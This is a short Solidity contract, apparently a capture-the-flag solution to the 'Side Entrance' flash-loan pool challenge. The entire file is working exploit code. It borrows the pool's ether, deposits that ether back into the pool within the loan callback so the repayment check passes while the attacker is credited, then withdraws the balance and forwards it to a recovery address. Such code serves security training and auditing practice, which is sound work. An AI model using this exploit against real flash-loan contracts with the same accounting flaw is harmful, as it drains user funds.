// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract SideEntranceReceiver {
    SideEntranceLenderPool pool;
    address recovery;
    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function flashLoan(uint256 amount) external payable{
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(amount);
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    receive() payable external {
    }
}